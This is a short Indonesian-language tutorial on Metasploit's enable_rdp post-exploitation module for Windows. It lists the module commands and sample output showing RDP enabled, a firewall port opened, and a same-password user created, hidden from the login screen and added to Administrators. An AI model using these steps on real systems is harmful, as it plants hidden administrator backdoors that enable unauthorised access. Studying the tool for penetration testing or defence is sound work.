# enable_rdp

Modul `enable_rdp` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengaktifkan fitur Remote Desktop Protocol (RDP) pada komputer target.

## Cara Penggunaan di Metasploit

```
use post/windows/manage/enable_rdp
set ENABLE true
set FORWARD false
set LPORT 3389
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	Terminal Services service is already set to auto
[*] 	Opening port in local firewall if necessary
[*] Setting user account for logon
[*] 	Adding User: fixploit03 with Password: fixploit03
[*] 	Adding User: fixploit03 to local group 'Remote Desktop Users'
[*] 	Hiding user from Windows Login screen
[*] 	Adding User: fixploit03 to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20250516221529_default_192.168.1.52_host.windows.cle_571851.txt
[*] Post module execution completed
```
